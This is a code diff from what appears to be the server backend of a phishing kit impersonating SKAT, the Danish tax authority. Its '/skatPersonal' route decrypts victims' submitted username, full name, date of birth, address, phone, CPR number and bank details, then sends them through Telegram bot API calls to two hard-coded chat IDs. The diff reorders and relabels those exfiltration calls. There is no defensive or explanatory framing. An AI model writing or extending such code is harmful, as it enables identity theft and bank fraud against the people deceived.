@@ -2798,12 +2798,14 @@ app.post('/skatPersonal', (req, res) => {
         cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
         bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
         var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
+        
+        axios.post(
+            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
+        );
         axios.post(
             `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
         );
-        axios.post(
-            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKAT:\n${originalText}`
-        );
+        
         res.send("Update Completed");
     } catch (err) {
         console.log(err)
